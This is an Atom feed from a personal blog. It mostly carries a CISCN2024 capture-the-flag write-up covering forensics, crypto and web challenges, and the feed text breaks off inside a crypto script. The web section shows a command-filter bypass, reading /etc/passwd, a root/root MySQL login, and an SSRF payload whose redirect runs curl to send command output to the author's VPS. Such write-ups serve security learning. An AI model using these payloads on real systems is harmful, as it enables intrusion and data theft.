<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Popayw🍭</title>
  
  
  <link href="https://www.fomal.cc/atom.xml" rel="self"/>
  
  <link href="https://www.fomal.cc/"/>
  <updated>2024-06-15T12:07:05.095Z</updated>
  <id>https://www.fomal.cc/</id>
  
  <author>
    <name>Popayw</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java内存马之tomcat内存马</title>
    <link href="https://www.fomal.cc/posts/bc31a7db.html"/>
    <id>https://www.fomal.cc/posts/bc31a7db.html</id>
    <published>2024-06-15T12:03:06.000Z</published>
    <updated>2024-06-15T12:07:05.095Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="364a40a0dcc1cae62f3e7364796ee6d8363ffc4064d5c14d4fd521132bdb4ec8">a7ae39568c02d7a175b7104c21717a1155a916598a2595d06e26149fdf2fe6bd9bf81602d4d72ad068e3f75f7d2db656590adc2e1ef9e578d91ec408e035e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Tomcat 内存马</summary>
    
    
    
    <category term="Java" scheme="https://www.fomal.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://www.fomal.cc/tags/Java/"/>
    
    <category term="Tomcat" scheme="https://www.fomal.cc/tags/Tomcat/"/>
    
    <category term="内存马" scheme="https://www.fomal.cc/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2024</title>
    <link href="https://www.fomal.cc/posts/f97bea14.html"/>
    <id>https://www.fomal.cc/posts/f97bea14.html</id>
    <published>2024-06-06T10:44:21.000Z</published>
    <updated>2024-06-07T11:01:50.288Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>misc</h1><h2 id="火锅链观光打卡">火锅链观光打卡</h2><p>微信公众号获得提示</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518092106435-1906075373.jpg" alt="4ce1a2288de3dff3307981a18d0c297"></p><p>提示装插件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518093835503-63519121.png" alt="image-20240518093832745"></p><p>然后开始游戏，攒够7种不同的食物，兑换即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518092502915-601390575.png" alt="image-20240518092459544"></p><p>flag{y0u_ar3_hotpot_K1ng}</p><h2 id="Power-Trajectory-Diagram">Power Trajectory Diagram</h2><p>拷打gpt写读取npz文件的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 .npz 文件</span></span><br><span class="line">file_path = <span class="string">&#x27;attachment.npz&#x27;</span></span><br><span class="line">data = np.load(file_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印文件中的数组名称</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Arrays in the .npz file:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(data.files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问和打印每个数组</span></span><br><span class="line"><span class="keyword">for</span> array_name <span class="keyword">in</span> data.files:</span><br><span class="line">    array = data[array_name]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nArray name: <span class="subst">&#123;array_name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(array)</span><br></pre></td></tr></table></figure><p>通过input、index、trace的内容可以分析出，它⼤概有13组数据每组数据对应⼀幅图，有点类似键盘敲击的</p><p>分析读取的三组数据，发现对应是13组图，每组数据对应一个最低点，再拷打gpt写个读取的最小值中的最大值</p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 .npz 文件中的数据</span></span><br><span class="line">data = np.load(<span class="string">&quot;attachment.npz&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 .npz 文件中提取 &#x27;index&#x27;, &#x27;trace&#x27;, 和 &#x27;input&#x27; 数组</span></span><br><span class="line">index = data[<span class="string">&#x27;index&#x27;</span>]</span><br><span class="line">trace = data[<span class="string">&#x27;trace&#x27;</span>]</span><br><span class="line">input_data = data[<span class="string">&#x27;input&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化一个空字符串，用于存储结果</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历范围 12，处理 input_data 的每一个 40 行块</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="comment"># 获取当前块的 40 行数据</span></span><br><span class="line">    table = input_data[<span class="number">40</span> * i: <span class="number">40</span> * (i + <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对于每一行（共 40 行），找到 trace 中每一行的最小值的索引</span></span><br><span class="line">    min_indices = [np.argmin(trace[i * <span class="number">40</span> + j]) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 找到上一步计算的最小值索引中的最大值索引</span></span><br><span class="line">    max_min_index = np.argmax(min_indices)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将表格中对应于最大最小值索引的值添加到结果字符串中</span></span><br><span class="line">    result += table[max_min_index]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印最终的结果字符串，不添加额外的换行符</span></span><br><span class="line"><span class="built_in">print</span>(result, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519181709916-367513063.png" alt="image-20240519181705080"></p><h2 id="通风机">通风机</h2><p>百度搜mwp文件咋打开</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153954328-756953515.png" alt="image-20240519153949675"></p><p>放进去发现提示不识别，用010打开后以及查看该文件头发现文件头缺失</p><p>先补全文件头</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153511943-1559805537.png" alt="image-20240519153507379"></p><p>用step工具打开</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153636844-961689750.png" alt="image-20240519153632511"></p><p>base64解码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153717629-1532464494.png" alt="image-20240519153712979"></p><h2 id="神秘文件">神秘文件</h2><p>将ppt文件转换为zip，文档打开找到，ppt信息里面也可以找到，懒得截图了<br>Part1:flag{e<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716106492580-26b1e005-7512-42d9-a272-151cd3f43b17.png#averageHue=%23231f1e&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=107&amp;id=u5940995a&amp;originHeight=167&amp;originWidth=803&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=14388&amp;status=done&amp;style=none&amp;taskId=uce27be34-720a-466e-855c-1aaa1b5ff9e&amp;title=&amp;width=513.92" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716107572564-18f01d74-a502-40d8-af18-9f2c23c4d3a4.png#averageHue=%23f6f2f1&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=415&amp;id=uf3912ae0&amp;originHeight=648&amp;originWidth=526&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=57053&amp;status=done&amp;style=none&amp;taskId=u6d2eea5d-5e52-47cf-bbcc-16d3b7e2d6c&amp;title=&amp;width=336.64" alt="image.png"><br>（算了还是截了）<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716107764486-62638e04-f9c4-4218-9de0-f56184826389.png#averageHue=%23fdfdfc&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=489&amp;id=ucc0600eb&amp;originHeight=764&amp;originWidth=1137&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=27692&amp;status=done&amp;style=none&amp;taskId=u0973da23-49da-459c-b2e5-9f912fa6356&amp;title=&amp;width=727.68" alt="image.png"><br>解密<br>part2:675efb<br>里面有个word，搞成zip解压<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716107925246-fe0a3e99-3fbd-4c65-9069-b3e0db9b6c6d.png#averageHue=%23221e1d&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=92&amp;id=ub31f8e2b&amp;originHeight=143&amp;originWidth=1631&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=33181&amp;status=done&amp;style=none&amp;taskId=ud19d7846-698c-466e-905f-285365225ec&amp;title=&amp;width=1043.84" alt="image.png"><br>接着凯撒爆破base64<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108031213-a6565110-6e74-4b6b-870b-4b311fdba2f9.png#averageHue=%23fcfcfb&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=602&amp;id=u57a3cf8a&amp;originHeight=940&amp;originWidth=2031&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=137352&amp;status=done&amp;style=none&amp;taskId=u7f8b762d-752c-478d-af51-e38d0ad79d0&amp;title=&amp;width=1299.84" alt="image.png"><br>PArt3:3-34<br>alt+F11打开vba代码<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108094760-e1590f14-1867-4228-8b08-26a43e592d5e.png#averageHue=%23fbfafa&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=401&amp;id=uc697dce8&amp;originHeight=627&amp;originWidth=826&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=36385&amp;status=done&amp;style=none&amp;taskId=ud3bae096-4853-4fa3-aced-d140a3df981&amp;title=&amp;width=528.64" alt="image.png"><br>问gpt是RC4（一直以为要写解密脚本！！！）<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108192751-d5e40af9-9475-41b2-9ddc-31427c36089b.png#averageHue=%23fdfdfd&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=502&amp;id=u8511315e&amp;originHeight=784&amp;originWidth=1288&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=32467&amp;status=done&amp;style=none&amp;taskId=u06617092-6b36-4c14-8f71-921c66983e4&amp;title=&amp;width=824.32" alt="image.png"><br>Payt4:6f-40<br>PPT给图片掀开<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108300557-25e6cd01-2729-47c5-9490-c04ef5a82deb.png#averageHue=%23fdf6d7&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=163&amp;id=u97438b20&amp;originHeight=254&amp;originWidth=1811&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=30298&amp;status=done&amp;style=none&amp;taskId=uf87699d3-5c7a-47d7-8d40-acd93b08f19&amp;title=&amp;width=1159.04" alt="image.png"><br>base64解密<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108384838-aa51d603-310f-4674-8b7f-5c29dec629ac.png#averageHue=%23fdfdfd&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=543&amp;id=u6c0e38ba&amp;originHeight=849&amp;originWidth=1262&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=23497&amp;status=done&amp;style=none&amp;taskId=u7247c690-186d-4958-ba7c-b20389589ab&amp;title=&amp;width=807.68" alt="image.png"><br>pArt5:5f-90d<br>第五页ppt<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108414303-ed12dfe7-8dfb-43f3-a604-53a7faa1c689.png#averageHue=%23565557&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=58&amp;id=u3d2f6a84&amp;originHeight=90&amp;originWidth=1352&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=21813&amp;status=done&amp;style=none&amp;taskId=u14d60f67-5708-4b5b-b65e-5ae19d3974d&amp;title=&amp;width=865.28" alt="image.png"><br>多轮base64解密<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108449233-8834d997-0c5b-4849-a675-1bb86e310e60.png#averageHue=%23fdfcfc&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=622&amp;id=SmmWX&amp;originHeight=972&amp;originWidth=1875&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=89549&amp;status=done&amp;style=none&amp;taskId=uca9840a1-c886-4d57-84cf-be608273c3d&amp;title=&amp;width=1200" alt="image.png"><br>ParT6:d-2<br>还是改为zip解压出来的题目里找到的<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108629143-0d7aab51-366f-40f3-9ac2-efc31576b3bc.png#averageHue=%23faf8f4&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=127&amp;id=u0408805e&amp;originHeight=199&amp;originWidth=988&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=31790&amp;status=done&amp;style=none&amp;taskId=ue6de49b7-7f91-4c08-aaa3-8bec3371696&amp;title=&amp;width=632.32" alt="image.png"><br>base64<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108642560-2fe27b40-d301-4b10-ac41-6d019d8c9fc8.png#averageHue=%23fcfcfc&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=522&amp;id=u84753e12&amp;originHeight=816&amp;originWidth=1090&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=22549&amp;status=done&amp;style=none&amp;taskId=u849dbd9d-f7a4-4268-ad9a-c5235e6d564&amp;title=&amp;width=697.6" alt="image.png"><br>PART7=22b3<br>在<code>ppt/slides/slide4.xml</code>下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108872948-8899a2b1-85d3-44ae-b15a-f932c3e3b90f.png#averageHue=%23231f1e&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=139&amp;id=u6e596ae0&amp;originHeight=217&amp;originWidth=951&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=32228&amp;status=done&amp;style=none&amp;taskId=u534bd39b-43e1-43b3-86dd-0702857c16c&amp;title=&amp;width=608.64" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716109032598-2b029db2-3a2b-4d7b-9616-1b58cd646e07.png#averageHue=%232c2821&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=40&amp;id=u8084d926&amp;originHeight=63&amp;originWidth=256&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=2843&amp;status=done&amp;style=none&amp;taskId=uf3f426e4-c5a1-41d0-b24f-8f1411abee3&amp;title=&amp;width=163.84" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108989806-a7901a7e-b2f9-4b98-8e07-1f3dc64b0933.png#averageHue=%23fcfcfc&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=484&amp;id=u995f9a43&amp;originHeight=757&amp;originWidth=1097&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=34671&amp;status=done&amp;style=none&amp;taskId=ud97e144d-73ae-41b0-97fe-9354f2045e4&amp;title=&amp;width=702.08" alt="image.png"><br>paRt8:87e<br><code>ppt\slideLayouts\slideLayout2.xml</code>下</p><p><img src="C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20240607161240682.png" alt="CNJBO9M$}2G(BF4_OT{PM`M.png"><br>可知密文去掉Bb13解base64</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607161420805-219422224.png" alt="image-20240607161418562"></p><p>paRt8:87e</p><p>在<code>ppt\media</code>下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716109359865-6a66e95f-4841-419d-834f-82d27db8a1b6.png#averageHue=%23736b67&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=435&amp;id=u005cc4f5&amp;originHeight=679&amp;originWidth=926&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=208387&amp;status=done&amp;style=none&amp;taskId=u7039193f-1dae-4917-a058-6c043e2ed1e&amp;title=&amp;width=592.64" alt="image.png"><br>解密<br><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607161506857-1018305141.png" alt="image-20240607161504364"><br>PARt10:9}<br>维吉尼亚 key也有<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716109807249-dfa68f6f-b9b1-428a-987a-d0dcfc97440b.png#averageHue=%235d5957&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=358&amp;id=u86103ed2&amp;originHeight=560&amp;originWidth=296&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=20380&amp;status=done&amp;style=none&amp;taskId=u5a9174d4-d5fd-4a9c-b841-dec50ca2811&amp;title=&amp;width=189.44" alt="image.png"></p><p>密文ZYWJbIYnFhq9，加密方式是维吉尼亚加密， 密钥furry</p><h2 id="Tough-DNS">Tough_DNS</h2><p>题目描述是一串16进制数据，解码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519164112092-139304058.png" alt="image-20240519164104332"></p><p>没解开，尝试通过逆序在进行16进制解码再逆序回来得到正常的数据</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607162353150-139741468.png" alt="image-20240607162350498"></p><p>在流量包中发现二进制域名</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519164505210-2099247586.png" alt="image-20240519164500340"></p><p>利用工具将域名提取到一个文件中，将其保存</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111111101100101111111111111101100101111111111111101100101111111111111101100101111111100000100100101000001100000100100101000001100000100100101000001100000100100101000001101110101010101011101101110101010101011101101110101010101011101101110101010101011101101110101001001011101101110101001001011101101110101001001011101101110101001001011101101110101110001011101101110101110001011101101110101110001011101101110101110001011101100000100000001000001100000100000001000001100000100000001000001100000100000001000001111111101010101111111111111101010101111111111111101010101111111111111101010101111111000000000110000000000000000000110000000000000000000110000000000000000000110000000000111100101010010011101111100101010010011101111100101010010011101111100101010010011101010010000010110111111010010000010110111111010010000010110111111010010000010110111111011001111000101100001011001111000101100001011001111000101100001011001111000101100001001110000110100001000001110000110100001000001110000110100001000001110000110100001000000101111001001100000000101111001001100000000101111001001100000000101111001001100000000000001111001110010000000001111001110010000000001111001110010000000001111001110010111111100100011010110111111100100011010110111111100100011010110111111100100011010110100000100011010000100100000100011010000100100000100011010000100100000100011010000100101110100001000010110101110100001000010110101110100001000010110101110100001000010110101110101110110100110101110101110110100110101110101110110100110101110101110110100110101110101011110101100101110101011110101100101110101011110101100101110101011110101100100000101110001111001100000101110001111001100000101110001111001100000101110001111001111111101111001111100111111101111001111100111111101111001111100111111101111001111100</span><br></pre></td></tr></table></figure><p>尝试后，发现可能是二维码，利用工具将其转换成二维码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607171710886-1959652525.png" alt="image-20240607171708632"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607171654722-1330033081.png" alt="image-20240607171652269"></p><p>扫描出来的结果如下：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519175734479-2049718795.png" alt="image-20240519175729877"></p><p>通过分析后续流量，利用 tshark 脚本分别导出 0x6421，0x4500 所对应的数据</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607172537896-665304996.png" alt="image-20240607172534679"></p><p>利用命令分别提取数据</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607182520917-1525444214.png" alt="image-20240607182517591"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607182547664-1913152725.png" alt="image-20240607182544589"></p><p>利用在线将其转换成文件</p><ul><li>0x4500文件，是一个压缩包</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607182800749-1063011295.png" alt="image-20240607182758675"></p><p>发现是一个带锁的gpg文件，将压缩包给名为1.zip</p><ul><li>0x6421是一个pgp文件</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607183022938-979978696.png" alt="image-20240607183020136"></p><p>将文件给名为2.pgp</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607183256747-1459349315.png" alt="image-20240607183254268"></p><p>提取gpg文件发现需要密码，结合题目，输入密码15f9792dba5c，拿到gpg文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607183431208-686758359.png" alt="image-20240607183428870"></p><p>利用PGPTool工具进行解密</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607185345779-1261008817.png" alt="image-20240607185342884"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607185418567-2134737422.png" alt="image-20240607185416426"></p><p>密码为最开始根据题目描述得到的数据，e9b0-ea5f9bae这个面膜不对，测试后发现还需要再逆序一下才行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607185958858-329278782.png" alt="image-20240607185956491"></p><p>拿到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190113553-606034123.png" alt="image-20240607190111445"></p><h1>Web</h1><h2 id="Simple-php">Simple_php</h2><p>测试发现能够执行<code>php -v</code>命令</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518132251631-1490700329.png" alt="image-20240518132248207"></p><p>因为存在过滤以及特殊函数<code>escapeshellcmd</code>，导致命令不能正常执行，可以构造十六进制数据结合<code>php -r</code>进行绕过</p><p><a href="https://lzltool.cn/Toolkit/ConvertStringToHexadecimal">在线字符串/十六进制互相转换—LZL在线工具 (lzltool.cn)</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518132828898-898802066.png" alt="image-20240518132825429"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607112312423-1255600154.png" alt="image-20240518134217969"></p><p>测试后发现根目录没有flag，利用<code>php</code>读<code>/etc/passwd</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518132332745-1157496133.png" alt="image-20240518132329161"></p><p>发现Mysql服务，根据root用户的账户名和密码，弱口令尝试登陆root/root</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518133750180-701643652.png" alt="image-20240518133746619"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518134922083-1666679704.png" alt="image-20240518134917547"></p><p>连接成功，进入PHP_CMS数据库，再查询表</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518133916900-1553976194.png" alt="image-20240518133913511"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518134838056-1875913792.png" alt="image-20240518134834000"></p><p>继续查数据</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518134413609-938358665.png" alt="image-20240518134410050"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518134735151-1797594180.png" alt="image-20240518134731217"></p><h2 id="easycms-revenge">easycms_revenge</h2><p>根据第一天的flag内容提示需要伪造&quot;REMOTE_ADDR&quot;，但是这个不可伪造，需要通过ssrf来打，通过网上搜索发现该cms存在qrcode+ssrf漏洞</p><p><a href="https://www.xunruicms.com/bug/">https://www.xunruicms.com/bug/</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519112818817-518530127.png" alt="image-20240519112814457"></p><p>github源码审计找到qrcode函数</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519112627631-54222019.png" alt="image-20240519112621674"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519150556186-876744862.png" alt="image-20240519150551391"></p><p><a href="https://www.xunruicms.com/doc/444.html">https://www.xunruicms.com/doc/444.html</a></p><p>查询文档发现参数可控，可以通过构造url来进行SSRF伪造进行外带，但是需要是一张<strong>图片</strong>能够使其识别</p><p>在自己的vps上写个文件<code>shell.php</code>，内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define width 8888</span></span><br><span class="line"><span class="comment">#define height 8888</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:http://127.0.0.1/flag.php?cmd=curl http://vpsip:port/?id=$(id)&quot;</span>);</span><br></pre></td></tr></table></figure><p>大概意思就是通过定义宽高来使其成为一张图片，绕过检测，再利用302跳转打SSRF</p><p>本地起一个python服务用来监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519113448411-499464643.png" alt="image-20240519113443683"></p><p>访问题目：</p><p><code>url/index.php?s=api&amp;c=api&amp;m=qrcode&amp;size=100&amp;level=10&amp;thumb=http://vpsip/shell.php&amp;text=1</code></p><p>执行命令成功，利用<code>ls /|sed -n 1p</code>查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519113835586-899329325.png" alt="image-20240519113830661">发现flag无法读取，继续遍历目录发现<code>readflag</code>可执行文件，输出readflag执行结果拿到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define width 8888</span></span><br><span class="line"><span class="comment">#define height 8888</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:http://127.0.0.1/flag.php?cmd=curl http://vpsip:port/?id=$(echo `/readflag`)&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519114409376-1817342022.png" alt="image-20240519114404928"></p><h1>Crypto</h1><h2 id="OvO">OvO</h2><p>先将e等式化简</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153056089-343697192.png" alt="image-20240519153050449"></p><p>可以看到化简方程最后只有p是未知，已知高位条件下e=(2+k)n，那么k=e//n-2，代入即可解出p的高位</p><p>已知p高位泄露直接打脚本即可</p><p>解题代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span 